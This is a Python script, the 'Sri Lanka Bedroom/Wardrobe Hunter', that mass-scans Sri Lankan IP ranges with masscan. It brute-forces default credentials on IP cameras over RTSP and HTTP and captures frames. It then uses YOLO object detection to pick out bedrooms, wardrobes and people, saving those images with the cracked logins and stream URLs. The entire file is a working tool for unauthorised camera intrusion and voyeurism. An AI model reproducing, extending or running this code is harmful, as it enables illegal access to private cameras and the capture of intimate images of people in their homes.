#!/usr/bin/env python3
"""
TITAN-X Sri Lanka Bedroom/Wardrobe Hunter v3 — FAST TCP pre-check
1. Masscan → find open ports
2. TCP connect pre-check → verify port actually accepts connections (0.8s)
3. RTSP brute (5 creds × 4 paths = 20 combos only) on verified IPs
4. HTTP snapshot (5 creds × 4 paths) on port 80/8000 IPs
5. YOLO classify → PRIORITY: bedroom, wardrobe
"""
import subprocess, os, json, time, shutil, socket, base64
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from urllib.request import urlopen, Request

W = '/root/vmos-titan-unified/vmos_titan/playground/cctv-tool'
FDIR = os.path.join(W, 'lk_frames')
SDIR = os.path.join(W, 'lk_bedrooms')
os.makedirs(FDIR, exist_ok=True)
os.makedirs(SDIR, exist_ok=True)

# Top 5 creds only for speed
CREDS = [('admin','12345'),('admin',''),('admin','admin'),('admin','1234'),('root','')]
# Top 4 RTSP paths
RPATHS = ['/Streaming/Channels/101','/Streaming/Channels/1','/h264/ch1/main/av_stream','/cam/realmonitor?channel=1&subtype=0']
# Top 4 HTTP snap paths
HPATHS = ['/ISAPI/Streaming/channels/101/picture','/cgi-bin/snapshot.cgi?channel=1','/snap.jpg','/Streaming/channels/1/picture']

LK_CIDRS = [
    '112.134.0.0/15','220.247.0.0/17','203.143.0.0/17','203.115.0.0/17',
    '124.43.0.0/16','175.157.0.0/16','192.248.0.0/16','103.0.0.0/16',
    '116.206.0.0/15','43.224.0.0/14','103.21.0.0/16','103.24.0.0/14',
    '202.21.0.0/16','202.69.0.0/16','61.245.160.0/19','122.255.0.0/16',
    '180.232.0.0/14','110.12.0.0/15','117.247.0.0/16','123.231.0.0/16',
    '150.129.0.0/16','163.32.0.0/16',
]

SCENE_MAP = {
    'bed':'bedroom','teddy bear':'bedroom','hair drier':'bedroom',
    'suitcase':'wardrobe','handbag':'wardrobe','backpack':'wardrobe','tie':'wardrobe',
    'refrigerator':'kitchen','oven':'kitchen','microwave':'kitchen','sink':'kitchen','toaster':'kitchen',
    'sofa':'living_room','couch':'living_room','tv':'living_room','remote':'living_room',
    'dining table':'dining_room','bowl':'dining_room','cup':'dining_room','wine glass':'dining_room',
    'laptop':'office','keyboard':'office','mouse':'office','book':'office',
    'toilet':'bathroom','toothbrush':'bathroom',
    'chair':'indoor','potted plant':'indoor','cell phone':'indoor','vase':'indoor',
    'car':'outside','truck':'outside','bus':'outside','motorcycle':'outside',
    'traffic light':'outside','stop sign':'outside','bicycle':'outside',
    'person':'has_person',
}
PRIORITY = {'bedroom','wardrobe'}
INDOOR = {'bedroom','wardrobe','dining_room','kitchen','living_room','office','bathroom','indoor'}

streams = []
st = {'rtsp':0,'http':0,'bed':0,'ward':0,'indoor':0}
yolo = None


def tcp_check(ip, port, timeout=0.8):
    """Fast TCP connect check — does port actually accept?"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((ip, port))
        s.close()
        return True
    except:
        return False


def valid_jpg(p):
    try:
        if not os.path.exists(p) or os.path.getsize(p) < 2000:
            return False
        with open(p,'rb') as f:
            if f.read(2) != b'\xff\xd8':
                return False
        import cv2
        img = cv2.imread(p)
        return img is not None and img.shape[0] >= 120 and img.shape[1] >= 160
    except:
        return False


def probe_rtsp(ip):
    frame = os.path.join(FDIR, f'{ip.replace(".","_")}.jpg')
    # TCP pre-check port 554
    if not tcp_check(ip, 554):
        return None
    for u, p in CREDS:
        for rp in RPATHS:
            auth = f'{u}:{p}@' if p else f'{u}:@'
            url = f'rtsp://{auth}{ip}:554{rp}'
            try:
                r = subprocess.run(
                    ['ffmpeg','-rtsp_transport','tcp','-i',url,'-vframes','1','-f','image2','-y',frame],
                    capture_output=True, timeout=4, text=True)
                if r.returncode == 0 and valid_jpg(frame):
                    return {'ip':ip,'type':'rtsp','user':u,'pass':p,'url':url,'frame':frame,'sz':os.path.getsize(frame)}
            except:
                pass
    try:
        if os.path.exists(frame) and not valid_jpg(frame): os.remove(frame)
    except: pass
    return None


def probe_http(ip, port):
    frame = os.path.join(FDIR, f'{ip.replace(".","_")}.jpg')
    if not tcp_check(ip, port):
        return None
    scheme = 'https' if port == 443 else 'http'
    for u, p in CREDS:
        ab = base64.b64encode(f'{u}:{p}'.encode()).decode()
        for hp in HPATHS:
            url = f'{scheme}://{ip}:{port}{hp}'
            try:
                req = Request(url, headers={'Authorization':f'Basic {ab}','User-Agent':'Mozilla/5.0'})
                resp = urlopen(req, timeout=3)
                data = resp.read(5_000_000)
                if len(data) > 2000:
                    with open(frame,'wb') as f: f.write(data)
                    if valid_jpg(frame):
                        return {'ip':ip,'type':'http','user':u,'pass':p,'url':url,'frame':frame,'sz':os.path.getsize(frame)}
                    try: os.remove(frame)
                    except: pass
            except:
                pass
    return None


def classify(frame):
    global yolo
    if not yolo: return None
    try:
        results = yolo(frame, conf=0.12, verbose=False)
        dets = []; votes = {}; person = False
        for r in results:
            for b in r.boxes:
                c = r.names[int(b.cls)]; cf = float(b.conf)
                dets.append((c,cf))
                if c == 'person': person = True; continue
                sc = SCENE_MAP.get(c)
                if sc and sc not in ('outside','has_person'):
                    boost = 1.5 if sc == 'bedroom' else (1.3 if sc == 'wardrobe' else 1.0)
                    votes[sc] = votes.get(sc,0) + cf*boost
        best = max(votes, key=votes.get) if votes else 'unclassified'
        return {'scene':best,'conf':round(votes.get(best,0),3),'objs':dets,'person':person}
    except:
        return None


def found(r):
    streams.append(r)
    n = len(streams)
    c = classify(r['frame'])
    r['cls'] = c or {'scene':'unknown','conf':0,'objs':[],'person':False}
    sc = r['cls']['scene']
    objs = ', '.join(f'{o}' for o,_ in r['cls'].get('objs',[])[:5])
    p = ' [PERSON]' if r['cls'].get('person') else ''
    
    if sc in PRIORITY:
        st['bed' if sc == 'bedroom' else 'ward'] += 1
        st['indoor'] += 1
        tag = f' ★★★ {sc.upper()} ★★★'
        dst = os.path.join(SDIR, f'LK_{sc}_{r["ip"].replace(".","_")}.jpg')
        shutil.copy2(r['frame'], dst)
        r['save'] = dst
    elif sc in INDOOR:
        st['indoor'] += 1
        tag = f' ◆ {sc}'
        dst = os.path.join(SDIR, f'LK_{sc}_{r["ip"].replace(".","_")}.jpg')
        shutil.copy2(r['frame'], dst)
    else:
        tag = f' ({sc})'
    
    print(f'  ✓ #{n:>3} {r["ip"]:>16} | {r["type"]:>4} | {r["user"]}:{r["pass"]:>8} | {r["sz"]:>8,}B{tag}{p}', flush=True)
    if objs: print(f'         → {objs}', flush=True)


def main():
    global yolo
    t0 = time.time()
    print(f'{"="*80}', flush=True)
    print(f'  TITAN-X SRI LANKA — BEDROOM/WARDROBE HUNTER v3 (FAST)', flush=True)
    print(f'  TCP pre-check → {len(CREDS)} creds × {len(RPATHS)} RTSP + {len(HPATHS)} HTTP', flush=True)
    print(f'  {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}', flush=True)
    print(f'{"="*80}\n', flush=True)

    try:
        from ultralytics import YOLO as Y
        mp = os.path.join(W, 'yolo11n.pt')
        yolo = Y(mp if os.path.exists(mp) else 'yolov8n.pt')
        print(f'[+] YOLO ready\n', flush=True)
    except Exception as e:
        print(f'[!] YOLO: {e}\n', flush=True)

    # ═══ PHASE 1: MASSCAN ═══
    print(f'[PHASE 1] MASSCAN — Sri Lanka', flush=True)
    cf = '/tmp/lk3_cidr.txt'
    mf = '/tmp/lk3_masscan.txt'
    with open(cf,'w') as f: f.write('\n'.join(LK_CIDRS))
    subprocess.run(['masscan','-iL',cf,'-p','554,8000,80,443,8200',
                     '--rate','500000','--open-only','-oG',mf,
                     '--exclude','255.255.255.255'], capture_output=True, timeout=300, text=True)
    
    ipp = {}
    if os.path.exists(mf):
        with open(mf) as f:
            for l in f:
                if l.startswith('#'): continue
                parts = l.split()
                ip = pt = None
                for i,p in enumerate(parts):
                    if p == 'Host:' and i+1<len(parts): ip = parts[i+1]
                    if 'Ports:' in p and i+1<len(parts): pt = parts[i+1].split('/')[0]
                if ip and pt: ipp.setdefault(ip,set()).add(pt)
    
    rtsp_ips = [ip for ip,p in ipp.items() if '554' in p]
    hik_ips = [ip for ip,p in ipp.items() if '8000' in p and '554' not in p]
    http_ips = [(ip,[int(x) for x in p if x in ('80','443','8200')]) 
                for ip,p in ipp.items() if '554' not in p and ('80' in p or '443' in p or '8200' in p)]
    
    total = len(ipp)
    print(f'  {total:,} hosts | {len(rtsp_ips)} RTSP | {len(hik_ips)} Hik | {len(http_ips)} HTTP', flush=True)

    # ═══ PHASE 2: TCP PRE-CHECK on RTSP IPs ═══
    all_rtsp = list(set(rtsp_ips + hik_ips))
    print(f'\n[PHASE 2] TCP PRE-CHECK — {len(all_rtsp)} camera IPs on port 554 (500 workers)', flush=True)
    alive_rtsp = []
    done = 0
    t_tcp = time.time()
    
    with ThreadPoolExecutor(max_workers=500) as pool:
        futs = {pool.submit(tcp_check, ip, 554, 0.8): ip for ip in all_rtsp}
        for fut in as_completed(futs):
            done += 1
            ip = futs[fut]
            try:
                if fut.result():
                    alive_rtsp.append(ip)
            except:
                pass
            if done % 2000 == 0:
                el = time.time() - t_tcp
                print(f'  [{done}/{len(all_rtsp)}] {el:.0f}s | {len(alive_rtsp)} alive', flush=True)
    
    el_tcp = time.time() - t_tcp
    print(f'  TCP done: {len(alive_rtsp)} alive from {len(all_rtsp)} in {el_tcp:.0f}s', flush=True)

    # ═══ PHASE 3A: RTSP BRUTE on alive IPs ═══
    print(f'\n[PHASE 3A] RTSP BRUTE — {len(alive_rtsp)} alive IPs | 300 workers', flush=True)
    done = 0
    t_rtsp = time.time()
    
    with ThreadPoolExecutor(max_workers=300) as pool:
        futs = {pool.submit(probe_rtsp, ip): ip for ip in alive_rtsp}
        for fut in as_completed(futs):
            done += 1
            try:
                r = fut.result()
                if r:
                    st['rtsp'] += 1
                    found(r)
            except:
                pass
            if done % 100 == 0:
                el = time.time() - t_rtsp
                rate = done/max(el,1)
                eta = (len(alive_rtsp)-done)/max(rate,.1)
                print(f'  [{done}/{len(alive_rtsp)}] {el:.0f}s | {len(streams)} found | {rate:.0f}/s | ETA {eta:.0f}s', flush=True)
    
    el_rtsp = time.time() - t_rtsp
    print(f'  RTSP: {st["rtsp"]} streams in {el_rtsp:.0f}s\n', flush=True)

    # ═══ PHASE 3B: HTTP SNAPSHOT on Hik + HTTP IPs ═══
    found_ips = {s['ip'] for s in streams}
    hik_todo = [(ip, 8000) for ip in hik_ips if ip not in found_ips]
    http_todo = [(ip, ports[0] if ports else 80) for ip, ports in http_ips if ip not in found_ips]
    all_http = hik_todo + http_todo
    
    print(f'[PHASE 3B] HTTP SNAPSHOT — {len(all_http)} IPs | 300 workers', flush=True)
    done = 0
    t_http = time.time()
    
    with ThreadPoolExecutor(max_workers=300) as pool:
        futs = {pool.submit(probe_http, ip, port): ip for ip, port in all_http}
        for fut in as_completed(futs):
            done += 1
            try:
                r = fut.result()
                if r:
                    st['http'] += 1
                    found(r)
            except:
                pass
            if done % 3000 == 0:
                el = time.time() - t_http
                rate = done/max(el,1)
                eta = (len(all_http)-done)/max(rate,.1)
                print(f'  [{done}/{len(all_http)}] {el:.0f}s | {len(streams)} total | {rate:.0f}/s | ETA {eta:.0f}s', flush=True)
    
    el_http = time.time() - t_http
    print(f'  HTTP: {st["http"]} snapshots in {el_http:.0f}s\n', flush=True)

    # ═══ FINAL REPORT ═══
    el = time.time() - t0
    print(f'\n{"="*80}', flush=True)
    print(f'  SRI LANKA HUNT COMPLETE — {el:.0f}s', flush=True)
    print(f'{"="*80}', flush=True)
    print(f'  Masscan:       {total:,} hosts', flush=True)
    print(f'  TCP alive:     {len(alive_rtsp)} (RTSP)', flush=True)
    print(f'  RTSP streams:  {st["rtsp"]}', flush=True)
    print(f'  HTTP snaps:    {st["http"]}', flush=True)
    print(f'  Total live:    {len(streams)}', flush=True)
    print(f'  ──────────────────────', flush=True)
    print(f'  ★ BEDROOMS:    {st["bed"]}', flush=True)
    print(f'  ★ WARDROBES:   {st["ward"]}', flush=True)
    print(f'  ◆ Indoor:      {st["indoor"]}', flush=True)
    
    sc_cnt = {}
    for s in streams:
        sc = s.get('cls',{}).get('scene','?')
        sc_cnt[sc] = sc_cnt.get(sc,0)+1
    if sc_cnt:
        print(f'\n  Scenes:', flush=True)
        for sc,cnt in sorted(sc_cnt.items(), key=lambda x:-x[1]):
            m = ' ★★★' if sc in PRIORITY else (' ◆' if sc in INDOOR else '')
            print(f'    {sc:>16}: {cnt}{m}', flush=True)
    
    indoor_list = [s for s in streams if s.get('cls',{}).get('scene','') in INDOOR]
    if indoor_list:
        print(f'\n  ═══ INDOOR ({len(indoor_list)}) ═══', flush=True)
        for i,s in enumerate(indoor_list,1):
            c = s.get('cls',{})
            pr = '★★★' if c.get('scene') in PRIORITY else '◆'
            p = ' [PERSON]' if c.get('person') else ''
            objs = ', '.join(o for o,_ in c.get('objs',[])[:5])
            print(f'  {pr} {i}. {s["ip"]:>16} | {c.get("scene","?"):>12} | {s["url"]}{p}', flush=True)
            if objs: print(f'       Objects: {objs}', flush=True)
    
    print(f'\n  ═══ ALL STREAMS ({len(streams)}) ═══', flush=True)
    for i,s in enumerate(streams,1):
        c = s.get('cls',{})
        sc = c.get('scene','?')
        tag = '★' if sc in PRIORITY else ('◆' if sc in INDOOR else ' ')
        p = '[P]' if c.get('person') else ''
        print(f'  {tag}{i:>3}. {s["ip"]:>16} | {sc:>12} | {s["type"]:>4} | {s["user"]}:{s["pass"]} {p}', flush=True)
    
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    out = os.path.join(W, f'lk_bedroom_{ts}.json')
    with open(out,'w') as f:
        json.dump({'LK':True,'priority':['bedroom','wardrobe'],'ts':ts,
                   'stats':{**st,'total':total,'rtsp_alive':len(alive_rtsp)},
                   'streams':[{k:v for k,v in s.items() if k!='frame'} for s in streams]
                  }, f, indent=2, default=str)
    print(f'\n  Saved: {out}', flush=True)
    print(f'  *** DONE ***', flush=True)


if __name__ == '__main__':
    main()
